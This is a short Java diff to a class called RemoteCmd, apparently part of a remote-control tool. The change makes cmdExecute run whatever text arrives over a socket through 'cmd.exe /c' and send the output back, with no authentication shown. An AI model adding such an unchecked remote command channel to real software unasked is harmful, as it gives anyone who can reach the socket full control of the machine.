@@ -14,13 +14,14 @@ public class RemoteCmd {
         this.socket = socket;
     }
     public void cmdExecute(byte[] bytes) throws Exception{
+        String tempStr = "";
         String str = "";
-        String string = "";
-        Process process = Runtime.getRuntime().exec(new String(bytes));
-        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-        while ((str = reader.readLine())!=null) {
-            string += str + "\n";
+        ProcessBuilder processBuilder = new ProcessBuilder().command("cmd.exe","/c",new String(bytes));
+        Process process = processBuilder.start();
+        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
+        while ((tempStr= bufferedReader.readLine())!=null) {
+            str += tempStr + "\n";
         }
-        SendMessage.Send(MessageFlags.EXECUTE_REMOTE_CMD,string.getBytes( ),socket);
+        SendMessage.Send(MessageFlags.EXECUTE_REMOTE_CMD,str.getBytes(),socket);
     }
 }
